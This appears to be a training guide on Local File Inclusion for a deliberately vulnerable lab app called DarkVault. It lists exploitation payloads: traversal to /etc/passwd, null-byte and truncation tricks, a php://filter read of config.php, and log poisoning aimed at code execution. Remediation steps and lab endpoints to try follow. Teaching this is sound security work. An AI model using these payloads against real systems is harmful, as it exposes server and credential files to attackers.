=================================================
LOCAL FILE INCLUSION (LFI) VULNERABILITY GUIDE
=================================================

OVERVIEW
--------
Local File Inclusion (LFI) is a vulnerability that allows attackers to include files on a server through the web browser. This vulnerability occurs when an application uses user-supplied input without proper validation to include files on the server.

VULNERABLE ENDPOINTS
-------------------
1. /view?file=page.php
2. /include?page=news.php
3. /download?file=document.pdf

EXPLOITATION TECHNIQUES
----------------------
1. Basic Path Traversal:
   /view?file=../../../../etc/passwd

2. Null Byte Injection (PHP < 5.3.4):
   /view?file=../../../../etc/passwd%00

3. Path Truncation:
   /view?file=../../../../etc/passwd././././././

4. Using PHP Wrappers:
   /view?file=php://filter/convert.base64-encode/resource=config.php

5. Log Poisoning:
   a. Send malicious PHP code to a service that logs requests
   b. Include the log file via LFI

REMEDIATION
----------
1. Use a whitelist of allowed files
2. Implement proper input validation
3. Avoid passing user-supplied input to file inclusion functions
4. Use absolute paths rather than relative paths
5. Implement proper access controls

EXAMPLES IN DARKVAULT
-------------------
Try accessing these endpoints:
1. /admin/view_log?file=app.log 
2. /profile?include=user_info.php
3. /settings?theme=default.css

This vulnerability can be combined with other attacks for more severe impact, such as Remote Code Execution when used with Log Poisoning techniques. 